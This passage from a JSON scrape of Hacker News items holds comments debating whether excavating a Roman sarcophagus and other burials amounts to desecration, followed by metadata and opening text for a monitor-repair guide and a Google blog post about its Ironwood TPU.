      "Something that always immensely bothers me about these kinds of things is that all the interest and excitement about archeological finds totally overshadows the reality that we are effectively sterilizing our whole earth when we dig up and remove artifacts whenever and wherever we find them, especially burials.It feels like a kind of end of civilization or even humanity type of thing, where at some point all of the earth will have been excavated and all human evidence will have been removed and catalogued and archived in some warehouse, totally sanitizing sterilizing the planet of human activity.When you look at it that way, to me at least it feels way more similar to colonial plundering like the Hispanics in South and Central America, totally devastating whole cultures, than some kind of righteous or even ethical practice, it is after all objectively desecration of burials that were never meant to be dug up to satisfy the curiosity and career of some rather selfish and increasingly irreligious academic.I say that while also being a bit conflicted because we have and do learn so much about things and cultures we have forgotten, were overrun, died out, or maybe were even intentionally erased from historical and cultural records. It does conflict me though in cases like this, where a burial is not respected and maybe reinterred when practical, but rather some detached and irreligious academic types pick apart the burial because they have lost all touch with the very humanity they seem to tell themselves they are studying; and the bones end up on some filing cabinet hundreds or even thousands of miles away.And that\u2019s without even addressing all the other sterilizing effects like digital \u201cobjects\u201d and throwaway culture and construction that will practically leave nothing of value left behind for some future people to find.Think about it, very little of today will be of value if it survives at all. There will be no way to discover what humans did in this period, because there is very little of anything physical that remains. My understanding is that outside of specific medium, none of the data we generate or consume will last, let alone survive something like a nuclear war or even a massive solar flair.reply",
      "The treatment archeological finds get today is downright religious compared \"that's a damn good stone, we'll use that stone for a lintel, chuck the skeleton in the river\" that would've happened prior to the modern era.reply",
      ">It feels like a kind of end of civilization or even humanity type of thing, where at some point all of the earth will have been excavated and all human evidence will have been removed and catalogued and archived in some warehouse, totally sanitizing sterilizing the planet of human activity.My understanding is that most countries prevent areas from being wholesale dug up, but only permit smaller, limited digs for this reason. So a representative sample of a site can be reexamined at a future date with future technology to reassess understanding. Some sites have had many many digs in this fashion, and still havent dug the entire site. In fact its a criticism of some semi famous sites, usually from charlatans, that the entire site hasnt been dug therefore we are leaving evidence of their popular wackjob ideas in the ground>because there is very little of anything physical that remains.I dont know thats true. Lots of what we do is kept and recorded. And our activity surely leaves traces. Plastics especially.>My understanding is that outside of specific medium, none of the data we generate or consume will last, let alone survive something like a nuclear war or even a massive solar flair.I dont believe this is true either. We arent backing our society up to a single old spinning disk. We have documents that immediately predate data storage. We have old documents stored in multiple places. We have lost certain specific artefacts of our own history but it seems doomerish to assume thats what happens universally.reply"
    ],
    "link": "https://apnews.com/article/hungary-roman-sarcophagus-discovery-budapest-77a41fe190bbcc167b43d05141536f54",
    "first_paragraph": ""
  },
  {
    "title": "Notes on the Troubleshooting and Repair of Computer and Video Monitors (repairfaq.org)",
    "points": 15,
    "submitter": "WorldPeas",
    "submit_time": "2025-11-25T22:40:52 1764110452",
    "num_comments": 0,
    "comments_url": "",
    "comments": [
      "xxx"
    ],
    "link": "https://www.repairfaq.org/sam/monfaq.htm",
    "first_paragraph": "\n\n\n\nTable of Contents\n\nPreface\n\nAuthor and Copyright\nDISCLAIMER\n\n\nIntroduction\n\nMonitors, monitors, and more monitors\nRelated Information\nMonitor fundamentals\nMonitor characteristics\nTypes of monitors\nWhy auto-scan?\nAnalog versus digital monitors\nInterlacing\nMonitor performance\nPerformance testing of monitors\nMonitor repair\nMost Common Problems\nRepair or replace\n\n\nMonitors 101\n\nSubsystems of a monitor\nFor more information on monitor technology\nOn-line tech-tips databases\nAdditional monitor technology and repair information\n\n\nCRT Basics\n\nColor CRTs - shadow masks and aperture grills\nDegaussing (demagnetizing) a CRT\nHow often to degauss\nWhy are there fine lines across my Trinitron monitor or TV?\n\n\nMonitor Placement and Preventive Maintenance\n\nGeneral monitor placement considerations\nNon-standard monitor mounting considerations\nPreventive maintenance - care and cleaning\nMonitor tuneup?\n\n\nMonitor Troubleshooting\n\nSAFETY\nWarning about disconnecting CRT neck board\nTroubleshooting tips\nTest e"
  },
  {
    "title": "Ironwood, our latest TPU (blog.google)",
    "points": 17,
    "submitter": "zdw",
    "submit_time": "2025-11-25T22:04:44 1764108284",
    "num_comments": 0,
    "comments_url": "",
    "comments": [
      "xxx"
    ],
    "link": "https://blog.google/products/google-cloud/ironwood-google-tpu-things-to-know/",
    "first_paragraph": "Nov 25, 2025\n          Our seventh-gen Tensor Processing Unit is here! Learn what makes Ironwood our most powerful and energy-efficient custom silicon to date.\n        Today's most advanced AI models, like those powering complex thinking and calculations, need speed and efficiency from the hardware that powers them. That's why at Cloud Next in April, we unveiled Ironwood, our seventh-generation Tensor Processing Unit (TPU).Ironwood is our most powerful, capable, and energy-efficient TPU yet, designed to power thinking, inferential AI models at scale.By acting as a hugely efficient parallel processor, Ironwood excels at managing massive calculations and significantly minimizes the internal time required for data to shuttle across the chip. This breakthrough dramatically speeds up complex AI, making models run significantly faster and smoother across our cloud.And now, Ironwood is here for Cloud customers.Here are three things to know about it.As the industry\u2019s focus shifts from training"
  }
]